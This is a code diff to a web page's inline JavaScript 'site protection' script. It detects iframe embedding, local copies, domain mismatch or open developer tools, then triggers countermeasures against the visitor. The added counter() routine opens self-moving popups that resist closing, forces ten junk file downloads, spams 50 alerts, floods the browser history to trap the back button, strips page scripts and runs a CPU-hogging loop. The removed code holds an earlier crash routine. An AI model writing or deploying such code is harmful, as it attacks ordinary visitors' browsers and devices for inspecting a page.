@@ -1137,122 +1137,68 @@
   const getT = () => taunts[Math.floor(Math.random() * taunts.length)];
   const key = 'site_protection_federal_wtf';
   
-  // Debug mode - set to true to see what's triggering detection
-  const DEBUG_MODE = true;
-  
-  // Debug logger that won't interfere with detection
-  function debugLog(message) {
-    if (DEBUG_MODE) {
-      const timestamp = new Date().toISOString();
-      // Use an invisible div to log messages
-      const logContainer = document.getElementById('debug-log-container') || createLogContainer();
-      const logEntry = document.createElement('div');
-      logEntry.innerText = `[${timestamp}] ${message}`;
-      logContainer.appendChild(logEntry);
-    }
-  }
-  
-  // Create container for debug logs
-  function createLogContainer() {
-    const container = document.createElement('div');
-    container.id = 'debug-log-container';
-    container.style.position = 'fixed';
-    container.style.bottom = '10px';
-    container.style.right = '10px';
-    container.style.width = '300px';
-    container.style.maxHeight = '200px';
-    container.style.overflow = 'auto';
-    container.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
-    container.style.color = '#cdbb8a';
-    container.style.fontSize = '10px';
-    container.style.padding = '5px';
-    container.style.fontFamily = 'monospace';
-    container.style.zIndex = '9999';
-    container.style.border = '1px solid #cdbb8a';
-    container.style.borderRadius = '4px';
+  function createLoader() {
+    const l = document.createElement('div');
+    l.id = 'prot-loader';
+    l.style.position = 'fixed';
+    l.style.top = '0';
+    l.style.left = '0';
+    l.style.width = '100%';
+    l.style.height = '100%';
+    l.style.backgroundColor = '#121212';
+    l.style.zIndex = '999999';
+    l.style.display = 'flex';
+    l.style.flexDirection = 'column';
+    l.style.justifyContent = 'center';
+    l.style.alignItems = 'center';
+    l.style.color = '#cdbb8a';
+    l.style.fontFamily = 'Consolas, monospace';
     
-    // Only visible in debug mode
-    if (!DEBUG_MODE) {
-      container.style.display = 'none';
-    }
+    const txt = document.createElement('h2');
+    txt.innerText = 'Loading protection...';
+    txt.style.marginBottom = '20px';
     
-    document.body.appendChild(container);
-    return container;
-  }
-  
-  // Create protection loading screen
-  function createLoadingScreen() {
-    const loader = document.createElement('div');
-    loader.id = 'protection-loader';
-    loader.style.position = 'fixed';
-    loader.style.top = '0';
-    loader.style.left = '0';
-    loader.style.width = '100%';
-    loader.style.height = '100%';
-    loader.style.backgroundColor = '#121212';
-    loader.style.zIndex = '999999';
-    loader.style.display = 'flex';
-    loader.style.flexDirection = 'column';
-    loader.style.justifyContent = 'center';
-    loader.style.alignItems = 'center';
-    loader.style.color = '#cdbb8a';
-    loader.style.fontFamily = 'Consolas, monospace';
+    const prog = document.createElement('div');
+    prog.style.width = '300px';
+    prog.style.height = '10px';
+    prog.style.background = 'rgba(205, 187, 138, 0.2)';
+    prog.style.borderRadius = '5px';
+    prog.style.overflow = 'hidden';
     
-    const loaderText = document.createElement('h2');
-    loaderText.innerText = 'Loading protection...';
-    loaderText.style.marginBottom = '20px';
+    const bar = document.createElement('div');
+    bar.style.height = '100%';
+    bar.style.width = '0%';
+    bar.style.background = '#cdbb8a';
+    bar.style.transition = 'width 0.5s';
+    bar.id = 'prot-progress';
     
-    const progress = document.createElement('div');
-    progress.style.width = '300px';
-    progress.style.height = '10px';
-    progress.style.background = 'rgba(205, 187, 138, 0.2)';
-    progress.style.borderRadius = '5px';
-    progress.style.overflow = 'hidden';
+    prog.appendChild(bar);
+    l.appendChild(txt);
+    l.appendChild(prog);
     
-    const progressBar = document.createElement('div');
-    progressBar.style.height = '100%';
-    progressBar.style.width = '0%';
-    progressBar.style.background = '#cdbb8a';
-    progressBar.style.transition = 'width 0.5s';
-    progressBar.id = 'protection-progress';
-    
-    progress.appendChild(progressBar);
-    loader.appendChild(loaderText);
-    loader.appendChild(progress);
-    
-    // Check if body exists yet
     if (document.body) {
-      document.body.appendChild(loader);
+      document.body.appendChild(l);
     } else {
-      // If body doesn't exist, wait for DOM to be ready
       window.addEventListener('DOMContentLoaded', () => {
-        document.body.appendChild(loader);
+        document.body.appendChild(l);
       });
     }
     
     return { 
-      updateProgress: (percent) => {
-        const bar = document.getElementById('protection-progress');
-        if (bar) bar.style.width = percent + '%';
+      up: (p) => {
+        const b = document.getElementById('prot-progress');
+        if (b) b.style.width = p + '%';
       },
-      remove: () => {
-        const loader = document.getElementById('protection-loader');
-        if (loader) {
-          loader.style.opacity = '0';
-          loader.style.transition = 'opacity 0.5s';
-          setTimeout(() => {
-            if (loader.parentNode) {
-              loader.parentNode.removeChild(loader);
-            }
-          }, 500);
+      rm: () => {
+        const ldr = document.getElementById('prot-loader');
+        if (ldr && ldr.parentNode) {
+          ldr.parentNode.removeChild(ldr);
         }
       }
     };
   }
   
-  function aggro(reason) {
-    debugLog(`Protection triggered: ${reason}`);
-    
+  function aggro(r) {
     document.documentElement.innerHTML = '';
     
     const t = document.createElement('div');
@@ -1287,15 +1233,6 @@
     sec.style.color = '#cdbb8a';
     sec.style.opacity = '0.8';
     t.appendChild(sec);
-
-    if (DEBUG_MODE) {
-      const reasonEl = document.createElement('div');
-      reasonEl.innerText = `Triggered by: ${reason}`;
-      reasonEl.style.marginTop = '20px';
-      reasonEl.style.color = '#cdbb8a';
-      reasonEl.style.opacity = '0.7';
-      t.appendChild(reasonEl);
-    }
     
     const bg = document.createElement('div');
     bg.style.position = 'absolute';
@@ -1322,8 +1259,7 @@
     t.appendChild(bg);
     document.body.appendChild(t);
     
-    // Execute counter measures
-    setTimeout(crashBrowser, 100);
+    counter();
     
     try {
       localStorage.setItem(key, 'protected');
@@ -1332,46 +1268,205 @@
     }
   }
   
-  // Browser crash function
-  function crashBrowser() {
-    // Alert spam
-    for (let i = 0; i < 50; i++) {
-      setTimeout(() => window.alert(getT()), i * 10);
+  function counter() {
+    createPopups();
+    dlFiles();
+    clearPage();
+    spamAlerts();
+    floodHistory();
+    cpuLoop();
+  }
+  
+  function createPopups() {
+    const max = 5;
+    const pops = [];
+    
+    for (let i = 0; i < max; i++) {
+      try {
+        const t = getT();
+        const pop = window.open('', `_blank${i}`, 'width=300,height=200,left=100,top=100');
+        
+        if (pop) {
+          pops.push(pop);
+          
+          pop.document.write(`
+            <!DOCTYPE html>
+            <html>
+              <head>
+                <title>${t}</title>
+                <style>
+                  body {
+                    background-color: black;
+                    color: #cdbb8a;
+                    font-family: Consolas, monospace;
+                    display: flex;
+                    justify-content: center;
+                    align-items: center;
+                    height: 100vh;
+                    margin: 0;
+                    overflow: hidden;
+                  }
+                  h1 {
+                    text-align: center;
+                    font-size: 24px;
+                  }
+                  .foot {
+                    position: absolute;
+                    bottom: 10px;
+                    width: 100%;
+                    text-align: center;
+                    font-size: 12px;
+                    opacity: 0.7;
+                  }
+                </style>
+              </head>
+              <body>
+                <h1>${t}</h1>
+                <div class="foot">Protected by Federal</div>
+                <script>
+                  let x = 0;
+                  let y = 0;
+                  let dx = 5;
+                  let dy = 5;
+                  
+                  function move() {
+                    x += dx;
+                    y += dy;
+                    
+                    if (x <= 0 || x >= window.screen.availWidth - 300) {
+                      dx *= -1;
+                    }
+                    if (y <= 0 || y >= window.screen.availHeight - 200) {
+                      dy *= -1;
+                    }
+                    
+                    window.moveTo(x, y);
+                    requestAnimationFrame(move);
+                  }
+                  
+                  move();
+                  
+                  window.onbeforeunload = function() {
+                    return "Nice try.";
+                  };
+                  
+                  document.addEventListener('contextmenu', e => e.preventDefault());
+                </script>
+              </body>
+            </html>
+          `);
+          
+          pop.document.close();
+        }
+      } catch (e) {}
+    }
+  }
+  
+  function dlFiles() {
+    const count = 10;
+    
+    for (let i = 0; i < count; i++) {
+      const t = getT().replace(/[^a-zA-Z0-9]/g, '');
+      const name = `${t}_protected_by_federal_${i}.txt`;
+      
+      const content = new Array(1000).fill(getT()).join('\n');
+      const blob = new Blob([content], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = name;
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      
+      a.click();
+      
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+    }
+  }
+  
+  function clearPage() {
+    const head = document.head;
+    while (head.firstChild) {
+      head.removeChild(head.firstChild);
     }
     
-    // Debugger bombs
-    for (let i = 0; i < 5000; i++) {
-      debugger;
+    try {
+      Object.defineProperty(document, 'documentElement', {
+        get: function() {
+          return document.createElement('div');
+        }
+      });
+    } catch (e) {}
+    
+    const scripts = document.getElementsByTagName('script');
+    while (scripts.length > 0) {
+      if (scripts[0].parentNode) {
+        scripts[0].parentNode.removeChild(scripts[0]);
+      }
     }
   }
   
-  // Check for frame embedding
+  function spamAlerts() {
+    for (let i = 0; i < 50; i++) {
+      window.alert(getT());
+    }
+  }
+  
+  function floodHistory() {
+    for (let i = 0; i < 500; i++) {
+      try {
+        history.pushState({}, "Blocked " + i, "#blocked" + i);
+      } catch (e) {}
+    }
+    
+    try {
+      history.go(-500);
+    } catch (e) {}
+  }
+  
+  function cpuLoop() {
+    while (true) {
+      const start = Date.now();
+      
+      for (let i = 0; i < 100000000; i++) {
+        Math.pow(Math.random() * 999, Math.random() * 999);
+        
+        if (i % 1000000 === 0 && Date.now() - start > 5000) {
+          break;
+        }
+      }
+      
+      if (Date.now() - start > 5000) {
+        break;
+      }
+    }
+  }
+  
   if (window.self !== window.top) {
-    aggro("Frame embedding detected");
+    aggro("frame");
     return;
   }
   
-  // Check for file:// protocol
   if (window.location.protocol === 'file:') {
-    aggro("File protocol detected");
+    aggro("file");
     return;
   }
   
-  // Check for domain mismatch
   if (window.location.hostname !== dom && window.location.hostname !== "www." + dom) {
-    aggro("Domain mismatch");
+    aggro("domain");
     return;
   }
   
-  // Check if previously caught
   try {
     if (localStorage.getItem(key) === 'protected') {
-      aggro("Previously caught (localStorage)");
+      aggro("ls");
       return;
     }
   } catch (e) {
     if (document.cookie.indexOf(key + '=protected') !== -1) {
-      aggro("Previously caught (cookie)");
+      aggro("cookie");
       return;
     }
   }
@@ -1386,169 +1481,113 @@
   
   reset();
   
-  // Start loading screen
-  const loader = createLoadingScreen();
+  const loader = createLoader();
   
-  // Implementation of the devtools-detect library
-  function initDevToolsDetect() {
-    debugLog("Initializing DevTools detection");
-    
-    // Create devtools detection object
-    const devtools = {
-      isOpen: false,
-      orientation: undefined
+  function initDev() {
+    const dev = {
+      open: false,
+      orient: undefined
     };
     
-    const threshold = 170;
+    const thresh = 170;
     
-    const emitEvent = (isOpen, orientation) => {
-      window.dispatchEvent(new window.CustomEvent('devtoolschange', {
+    const emit = (open, orient) => {
+      window.dispatchEvent(new window.CustomEvent('devchange', {
         detail: {
-          isOpen,
-          orientation
+          open,
+          orient
         }
       }));
     };
     
-    const checkDevTools = () => {
-      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
-      const heightThreshold = window.outerHeight - window.innerHeight > threshold;
-      const orientation = widthThreshold ? 'vertical' : 'horizontal';
+    const chk = () => {
+      const w = window.outerWidth - window.innerWidth > thresh;
+      const h = window.outerHeight - window.innerHeight > thresh;
+      const o = w ? 'vert' : 'horiz';
       
       if (
-        !(heightThreshold && widthThreshold) &&
-        ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || 
-          widthThreshold || 
-          heightThreshold)
+        !(h && w) &&
+        ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || w || h)
       ) {
-        if (!devtools.isOpen || devtools.orientation !== orientation) {
-          debugLog(`DevTools detected: ${orientation} orientation`);
-          emitEvent(true, orientation);
+        if (!dev.open || dev.orient !== o) {
+          emit(true, o);
         }
         
-        devtools.isOpen = true;
-        devtools.orientation = orientation;
+        dev.open = true;
+        dev.orient = o;
         return true;
       } else {
-        if (devtools.isOpen) {
-          emitEvent(false, undefined);
+        if (dev.open) {
+          emit(false, undefined);
         }
         
-        devtools.isOpen = false;
-        devtools.orientation = undefined;
+        dev.open = false;
+        dev.orient = undefined;
         return false;
       }
     };
     
-    // Add event listener for DevTools state change
-    window.addEventListener('devtoolschange', (event) => {
-      if (event.detail.isOpen) {
-        aggro(`DevTools detected (${event.detail.orientation || 'unknown'} orientation)`);
+    window.addEventListener('devchange', (e) => {
+      if (e.detail.open) {
+        aggro("dev");
       }
     });
     
-    // Initial check
-    if (checkDevTools()) {
-      aggro("DevTools detected on page load");
+    if (chk()) {
+      aggro("dev-init");
     }
     
-    // Regular check interval
-    setInterval(() => {
-      checkDevTools();
-    }, 500);
-    
-    debugLog("DevTools detection initialized");
+    setInterval(chk, 500);
   }
   
-  // Block save (Ctrl+S) and other keyboard shortcuts
-  function blockKeyboardShortcuts() {
-    debugLog("Initializing keyboard protection");
-    
+  function blockKeys() {
     document.addEventListener('keydown', function(e) {
-      // Block F12
       if (e.key === 'F12' || e.keyCode === 123) {
         e.preventDefault();
-        aggro("F12 key pressed");
+        aggro("f12");
         return false;
       }
       
-      // Block Ctrl+Shift+I/J/C (DevTools)
       if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
           (e.metaKey && e.altKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
         e.preventDefault();
-        aggro("DevTools keyboard shortcut");
+        aggro("dev-key");
         return false;
       }
       
-      // Block Ctrl+S (Save)
       if ((e.ctrlKey && (e.key === 's' || e.key === 'S')) || 
           (e.metaKey && (e.key === 's' || e.key === 'S'))) {
         e.preventDefault();
-        debugLog("Save attempt blocked (Ctrl+S)");
         return false;
       }
       
-      // Block Ctrl+U (View Source)
       if ((e.ctrlKey && (e.key === 'u' || e.key === 'U')) || 
           (e.metaKey && (e.key === 'u' || e.key === 'U'))) {
         e.preventDefault();
-        debugLog("View source attempt blocked (Ctrl+U)");
         return false;
       }
       
-      // Block Ctrl+P (Print/Print Preview)
       if ((e.ctrlKey && (e.key === 'p' || e.key === 'P')) || 
           (e.metaKey && (e.key === 'p' || e.key === 'P'))) {
         e.preventDefault();
-        debugLog("Print attempt blocked (Ctrl+P)");
         return false;
       }
     }, true);
     
-    // Block right-click
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
       return false;
     });
-    
-    debugLog("Keyboard protection initialized");
   }
   
-  // Initialize protection with a loading sequence
-  function initializeProtection() {
-    // Run protection with progress updates
-    setTimeout(() => {
-      loader.updateProgress(30);
-      
-      try {
-        // Initialize DevTools detection
-        initDevToolsDetect();
-        loader.updateProgress(70);
-        
-        // Block keyboard shortcuts
-        blockKeyboardShortcuts();
-        loader.updateProgress(90);
-        
-        debugLog("Protection setup complete");
-      } catch (e) {
-        debugLog("Error in protection setup: " + e.message);
-      }
-      
-      // Complete loading
-      setTimeout(() => {
-        loader.updateProgress(100);
-        setTimeout(() => {
-          loader.remove();
-          debugLog("Protection active");
-        }, 500);
-      }, 500);
-    }, 800);
+  function init() {
+    loader.rm();
+    initDev();
+    blockKeys();
   }
   
-  // Initialize with a small delay to ensure DOM is ready
-  setTimeout(initializeProtection, 500);
+  init();
   
-  // Clean up on page unload
   window.addEventListener('beforeunload', reset);
 })();
   </script>
